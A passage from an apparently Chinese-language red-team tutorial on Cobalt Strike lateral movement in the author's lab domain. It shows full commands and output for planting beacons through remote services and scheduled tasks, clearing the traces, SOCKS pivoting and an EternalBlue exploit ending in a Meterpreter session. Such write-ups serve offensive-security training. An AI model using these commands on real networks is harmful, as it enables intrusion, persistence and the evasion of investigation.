Windows Executable(s)</code> 处进行创建</p><p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的</p><p><strong>上传可执行文件</strong></p><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> file.exe \\host\C<span class="variable">$</span>\Windows\Temp</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; upload /root/beacon.exe</span><br><span class="line">[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">289302</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">copy</span> beacon.exe \\WinTest\C<span class="variable">$</span>\Windows\Temp</span><br><span class="line">[+] host called home, sent: <span class="number">72</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">已复制<span class="number">1</span> 个文件。</span><br></pre></td></tr></table></figure><p><strong>执行文件（方法一）</strong></p><p>1、生成 Windows Service EXE 并上传</p><p>2、在目标主机上创建一个服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host create name binpath= c:\windows\temp\file.exe</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">93</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] CreateService 成功</span><br></pre></td></tr></table></figure><blockquote><p>注：记住 binpath 路径</p></blockquote><p>3、在目标主机上启动服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">sc</span> \\host <span class="built_in">start</span> name</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest <span class="built_in">start</span> beacon</span><br><span class="line">[+] host called home, sent: <span class="number">56</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">SERVICE_NAME: beacon </span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">3816</span></span><br><span class="line">        FLAGS              : </span><br><span class="line">        </span><br><span class="line">beacon&gt; link wintest</span><br><span class="line">[*] Tasked to link to \\wintest\pipe\msagent_da00</span><br><span class="line">[+] host called home, sent: <span class="number">36</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.130</span></span><br></pre></td></tr></table></figure><p>4、清除痕迹与服务</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\host delete name</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">del</span> beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">57</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">del</span> \\wintest\C<span class="variable">$</span>\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">83</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">sc</span> \\wintest delete beacon</span><br><span class="line">[+] host called home, sent: <span class="number">69</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[<span class="type">SC</span>] DeleteService 成功</span><br></pre></td></tr></table></figure><p><strong>执行文件（方法二）</strong></p><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code>Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p><p>2、找到目标系统上的时间</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net time \\host</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net time \\windc</span><br><span class="line">[*] Tasked beacon to run: net time \\windc</span><br><span class="line">[+] host called home, sent: <span class="number">49</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">\\windc 的当前时间是 <span class="number">2020</span>/<span class="number">8</span>/<span class="number">30</span> <span class="number">14</span>:<span class="number">54</span>:<span class="number">09</span></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>3、创建一个计划任务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell at \\host HH:mm C:\path\to\bad.exe</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: at \\windc <span class="number">15</span>:<span class="number">00</span> C:\windows\temp\beacon.exe</span><br><span class="line">[+] host called home, sent: <span class="number">76</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">新加了一项作业，其作业 ID = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; link windc</span><br><span class="line">[*] Tasked to link to \\windc\pipe\msagent_d76a</span><br><span class="line">[+] host called home, sent: <span class="number">34</span> bytes</span><br><span class="line">[+] established link to child beacon: <span class="number">192.168</span>.<span class="number">175.144</span></span><br></pre></td></tr></table></figure><p><strong>beacon 的自动操作</strong></p><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p><ul><li>使用一个服务运行可执行文件</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec [<span class="type">target</span>] [<span class="type">share</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure><ul><li>使用一个服务运行 Powershell 单行程序</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec_psh [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure><ul><li>通过 WinRM 运行 Powershell 单行程序</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure><ul><li>通过 WMI 运行 Powershell 单行程序</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmi [<span class="type">target</span>] [<span class="type">listener</span>]</span><br></pre></td></tr></table></figure><p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p><p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view</span><br><span class="line">[*] Tasked beacon to run net view</span><br><span class="line">[+] host called home, sent: <span class="number">104504</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">List of hosts:</span><br><span class="line">[+] received output:</span><br><span class="line"> Server Name             IP Address                       Platform  Version  <span class="built_in">Type</span>   Comment</span><br><span class="line"> <span class="literal">-----------</span>             <span class="literal">----------</span>                       <span class="literal">--------</span>  <span class="literal">-------</span>  <span class="literal">----</span>   <span class="literal">-------</span>            </span><br><span class="line"> WINDC                   <span class="number">192.168</span>.<span class="number">175.144</span>                  <span class="number">500</span>       <span class="number">6.1</span>      PDC    </span><br><span class="line"> WINTEST                 <span class="number">192.168</span>.<span class="number">175.130</span>                  <span class="number">500</span>       <span class="number">6.1</span>         </span><br></pre></td></tr></table></figure><p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell<span class="literal">-import</span> PowerView.ps1</span><br><span class="line">[*] Tasked beacon to import: PowerView.ps1</span><br><span class="line">[+] host called home, sent: <span class="number">101224</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[+] host called home, sent: <span class="number">329</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">WinDC.teamssix.com</span><br></pre></td></tr></table></figure><p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌</p><p>应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的</p><p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动</p><h5 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h5><h6 id="1、SOCKS-代理转发"><a href="#1、SOCKS-代理转发" class="headerlink" title="1、SOCKS 代理转发"></a>1、SOCKS 代理转发</h6><p>在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 <code>sleep 0</code> 即为交互模式</p><p><strong>Socks</strong></p><ul><li>在当前 beacon 上可以右击选择 <code>Pivoting --&gt; SOCKS Server</code> 设置一个 Socks4a 代理服务</li><li>或者使用命令 <code>socks [port]</code> 进行设置</li><li>使用命令 <code>socks stop</code> 关闭 Socks 代理服务</li><li>在 <code>View --&gt; Proxy Pivots</code> 中可以看到已经创建的代理服务</li></ul><p><strong>Metasploit 连接到 Socks 代理服务</strong></p><ul><li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:[port]</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure><p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p><ul><li>运行以下命令来停止</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsetg Proxies</span><br></pre></td></tr></table></figure><p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p><p><strong>演示</strong></p><p>1、环境说明</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0&#x2F;24 地址段</p></blockquote><p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0&#x2F;24 地址段内，但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式</p><p>2、设置 socks 代理</p><p>开启交互模式  sleep 0</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">sleep</span> <span class="number">0</span></span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure><p>开启 socks 代理  socks 9527</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; socks <span class="number">9527</span></span><br><span class="line">[+] started SOCKS4a server on: <span class="number">9527</span></span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure><p>以上操作也可以通过图形化的方式进行。</p><p>3、Metasploit 中进行设置</p><p>开启 Metasploit 后，运行 setg 命令  setg Proxies socks4:192.168.175.200:9527</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br><span class="line">Proxies =&gt; socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br></pre></td></tr></table></figure><p>4、扫描 192.168.232.0&#x2F;24 地址段中的 445 端口</p><p>这里作为演示，只扫描一下 445 端口</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhost 192.168.232.0/24</span><br><span class="line">set threads 64</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_version </span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> rhost <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span> </span><br><span class="line">rhost =&gt; <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> threads <span class="number">64</span></span><br><span class="line">threads =&gt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; exploit </span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">44</span> of <span class="number">256</span> hosts (<span class="number">17</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">64</span> of <span class="number">256</span> hosts (<span class="number">25</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">110</span> of <span class="number">256</span> hosts (<span class="number">42</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">111</span> of <span class="number">256</span> hosts (<span class="number">43</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">128</span> of <span class="number">256</span> hosts (<span class="number">50</span>% complete)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.133</span>:<span class="number">445</span>   - Host is running Windows <span class="number">7</span> Ultimate SP1 (build:<span class="number">7601</span>) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is running Windows <span class="number">2008</span> HPC SP1 (build:<span class="number">7601</span>) (name:WINDC) (domain:TEAMSSIX) (signatures:required)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">165</span> of <span class="number">256</span> hosts (<span class="number">64</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">184</span> of <span class="number">256</span> hosts (<span class="number">71</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">220</span> of <span class="number">256</span> hosts (<span class="number">85</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">249</span> of <span class="number">256</span> hosts (<span class="number">97</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">256</span> of <span class="number">256</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>5、发现利用</p><p>通过扫描发现在 192.168.232.0&#x2F;24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.232.132</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="keyword">Using</span> auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is likely VULNERABLE to MS17<span class="literal">-010</span>! - Windows Server <span class="number">2008</span> HPC Edition <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span><span class="literal">-bit</span>)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - CORE raw buffer dump (<span class="number">51</span> bytes)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000000  <span class="number">57</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">6</span>f <span class="number">77</span> <span class="number">73</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">20</span> <span class="number">32</span>  Windows Server <span class="number">2</span></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000010  <span class="number">30</span> <span class="number">30</span> <span class="number">38</span> <span class="number">20</span> <span class="number">48</span> <span class="number">50</span> <span class="number">43</span> <span class="number">20</span> <span class="number">45</span> <span class="number">64</span> <span class="number">69</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">20</span>  <span class="number">008</span> HPC Edition </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000020  <span class="number">37</span> <span class="number">36</span> <span class="number">30</span> <span class="number">31</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">69</span> <span class="number">63</span> <span class="number">65</span> <span class="number">20</span> <span class="number">50</span> <span class="number">61</span> <span class="number">63</span>  <span class="number">7601</span> Service Pac</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000030  <span class="number">6</span>b <span class="number">20</span> <span class="number">31</span>                                         k <span class="number">1</span>             </span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Trying exploit with <span class="number">12</span> Groom Allocations.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending all but last fragment of exploit packet</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Starting non<span class="literal">-paged</span> pool grooming</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending SMBv2 buffers</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending final SMBv2 buffers.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending last fragment of exploit packet!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Receiving response from exploit packet</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="number">0</span>xC000000D)!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending egg to corrupted connection.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Triggering free of corrupted buffer.</span><br><span class="line">[*] Started bind TCP handler against <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">4444</span></span><br><span class="line">[*] Sending stage (<span class="number">201283</span> bytes) to <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span> -&gt; <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>) at <span class="number">2020</span><span class="literal">-09-01</span> <span class="number">22</span>:<span class="number">13</span>:<span class="number">57</span> <span class="literal">-0400</span></span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=<span class="literal">-WIN-</span>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface <span class="number">11</span></span><br><span class="line">============</span><br><span class="line">Name         : Intel(<span class="built_in">R</span>) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">Hardware MAC : <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:d3:<span class="number">6</span>c:<span class="number">3</span>d</span><br><span class="line">MTU          : <span class="number">1500</span></span><br><span class="line">IPv4 Address : <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">IPv4 Netmask : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">IPv6 Address : fe80::a1<span class="built_in">ac</span>:<span class="number">3035</span>:cbdf:<span class="number">4872</span></span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p><strong>使用 ProxyChains 